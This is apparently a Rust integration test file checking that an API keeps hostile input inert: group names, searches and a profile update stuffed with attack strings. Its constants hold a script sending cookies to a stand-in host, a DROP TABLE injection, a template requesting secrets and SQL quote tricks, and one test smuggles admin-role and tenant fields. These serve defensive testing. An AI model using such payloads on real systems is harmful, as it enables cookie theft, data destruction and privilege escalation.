//! Mallory feeds the API input written to be run or to sneak past what a
//! request may change: SQL that ends a statement, a template asking for a
//! secret, a script, a character a database cannot store, searches made of
//! wildcards and quotes, and fields a request does not offer. Text is kept
//! exactly as written and never runs, what cannot be kept is refused as a
//! bad request rather than breaking anything, a wildcard searches for
//! itself, and a field a request does not offer changes nothing.

use ianua_scenarios::actors::Person;
use ianua_scenarios::api::{Request, audit, people, policies};
use ianua_scenarios::net::Call;
use ianua_scenarios::stack::{Profile, Stack};
use ianua_scenarios::wire::Status;
use ianua_scenarios::wire::people::InviteUser;
use ianua_scenarios::wire::policies::NewGroup;
use ianua_scenarios::world::{ADMIN_ROLE, MEMBER_ROLE, World};
use serde::de::IgnoredAny;
use serde_json::json;

/// Names written to be run: SQL closing its statement and dropping a
/// table, a template asking for a secret, and a script.
const HOSTILE_NAMES: [&str; 3] = [
    "Robert'); DROP TABLE users;--",
    "{{ secrets.HMAC_SECRET }} ${ENCRYPTION_KEY}",
    "<script>fetch('https://mallory.test/'+document.cookie)</script>",
];

/// Searches made to match everything: SQL wildcards, a quote that ends a
/// string, and a comment.
const HOSTILE_SEARCHES: [&str; 4] = ["%", "_", "' OR '1'='1", "x' --"];

/// Tess names groups with SQL, a template and a script: each reads back
/// exactly as written. A name holding a character no database keeps, and
/// one far too long, are refused as bad requests, not server errors. The
/// people list still answers afterwards, so nothing ran.
#[tokio::test]
async fn hostile_names_are_kept_as_written_and_never_run() {
    let stack = Stack::start(Profile::standard())
        .await
        .expect("the stack starts");
    let world = World::new(&stack).await;
    let tess = world.admin().client();

    for name in HOSTILE_NAMES {
        let made = policies::create_group(world.tenant(), &named(name))
            .send(tess)
            .await
            .ok();
        let kept = policies::group(world.tenant(), &made.id)
            .send(tess)
            .await
            .ok();
        assert_eq!(kept.name, name, "the name was kept as written");
    }
    for name in ["Night\u{0}shift".to_owned(), "a".repeat(10_000)] {
        let refused = policies::create_group(world.tenant(), &named(&name))
            .send(tess)
            .await;
        assert!(
            refused.status().is_client_error(),
            "an unkeepable name is a bad request: {}",
            refused.summary()
        );
    }
    people::list(world.tenant(), None).send(tess).await.ok();
    stack.stop().await.expect("the stack stops cleanly");
}

/// Pat joins the tenant. Tess searches people by email and the audit
/// trail by type with wildcards, a quote and a comment: each search
/// answers and finds nobody and no record, while a search for part of
/// Pat's address finds Pat and the unsearched trail holds records.
#[tokio::test]
async fn wildcards_and_quotes_search_for_themselves() {
    let stack = Stack::start(Profile::standard())
        .await
        .expect("the stack starts");
    let world = World::new(&stack).await;
    let pat = joined(&world).await;
    let tess = world.admin().client();
    let part_of_pat = &pat.email()[..3];
    let pat_found = people::list(world.tenant(), Some(part_of_pat))
        .send(tess)
        .await
        .ok();
    let records_kept = audit::tenant_log(world.tenant(), "").send(tess).await.ok();

    for search in HOSTILE_SEARCHES {
        let people_found = people::list(world.tenant(), Some(search))
            .send(tess)
            .await
            .ok();
        let records_found = audit::tenant_log(world.tenant(), search)
            .send(tess)
            .await
            .ok();
        assert!(people_found.items.is_empty(), "{search:?} found people");
        assert!(records_found.items.is_empty(), "{search:?} found records");
    }

    assert!(
        pat_found.items.iter().any(|user| user.id == pat.id()),
        "a real search still finds Pat"
    );
    assert!(!records_kept.items.is_empty(), "the tenant has records");
    stack.stop().await.expect("the stack stops cleanly");
}

/// Pat changes her own language, and slips into the same request a new
/// address, a new name, a verified flag, an active status, an admin role
/// and another tenant. Her language changes and nothing else does: her
/// record is as it was, and the people list is still closed to her.
#[tokio::test]
async fn fields_a_request_does_not_offer_change_nothing() {
    let stack = Stack::start(Profile::standard())
        .await
        .expect("the stack starts");
    let world = World::new(&stack).await;
    let pat = joined(&world).await;
    let before = people::me(world.tenant()).send(pat.client()).await.ok();
    let smuggled: Request<IgnoredAny> =
        Request::of(Call::patch(world.tenant().at("/me")).json(&json!({
            "locale": "de",
            "email": "mallory@mallory.test",
            "display_name": "Mallory",
            "email_verified": true,
            "status": "Active",
            "role_id": world.role_id(ADMIN_ROLE).await,
            "roles": [ADMIN_ROLE],
            "tenant_id": "00000000-0000-0000-0000-000000000001",
        })));

    let answer = smuggled.send(pat.client()).await;
    let after = people::me(world.tenant()).send(pat.client()).await.ok();
    people::list(world.tenant(), None)
        .send(pat.client())
        .await
        .refused(Status::FORBIDDEN, "forbidden");

    assert!(
        answer.status().is_success() || answer.status().is_client_error(),
        "the request is taken or refused, never a server error: {}",
        answer.summary()
    );
    assert_eq!(
        (after.email.as_str(), after.display_name.as_str()),
        (before.email.as_str(), before.display_name.as_str()),
        "her address and name are as they were"
    );
    assert_eq!(
        (after.status.as_str(), after.email_verified),
        (before.status.as_str(), before.email_verified),
        "her standing is as it was"
    );
    stack.stop().await.expect("the stack stops cleanly");
}

/// A group named `name`.
fn named(name: &str) -> NewGroup {
    NewGroup {
        name: name.to_owned(),
    }
}

/// Pat, invited by Tess with the member role, joined and signed in.
async fn joined(world: &World<'_>) -> Person {
    let mut pat = world.newcomer("pat", "Pat Person");
    let invitation = InviteUser {
        email: pat.email().to_owned(),
        display_name: "Pat Person".to_owned(),
        role_id: world.role_id(MEMBER_ROLE).await,
    };
    let made = people::invite(world.tenant(), &invitation)
        .send(world.admin().client())
        .await
        .ok();
    pat.record_invitation(&made.id);
    pat.accept_invitation(world.stack()).await;
    pat.sign_in(world.stack()).await;
    pat
}
